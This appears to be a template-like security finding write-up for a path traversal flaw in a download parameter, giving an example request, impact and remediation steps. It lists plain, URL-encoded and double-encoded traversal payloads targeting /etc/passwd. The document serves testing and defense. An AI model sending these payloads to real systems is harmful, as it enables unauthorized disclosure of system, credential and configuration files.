
# PS-007 — Path Traversal: Read Arbitrary File
**Date / Analyst:** $(date +%F) — Christopher Araque

## TL;DR
Parameter `file`/`path` is not sanitized; `../../..` leads to `/etc/passwd`.

## Endpoint
- <fill after recon> e.g., GET /download?file=../../../../../../etc/passwd

## Evidence
- Request/Response: [ps-007-request.txt](../../evidence/ps-traversal/ps-007-request.txt)
- Screenshot: ![PS‑007](../../evidence/ps-traversal/ps-007-screenshot.png)

## Payloads
../../../../../../etc/passwd
..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

## Impact
Sensitive file disclosure (configs/keys/creds).

## Fix
Canonicalize path; allow‑list files; deny `..` + encoded variants; sandbox/chroot.
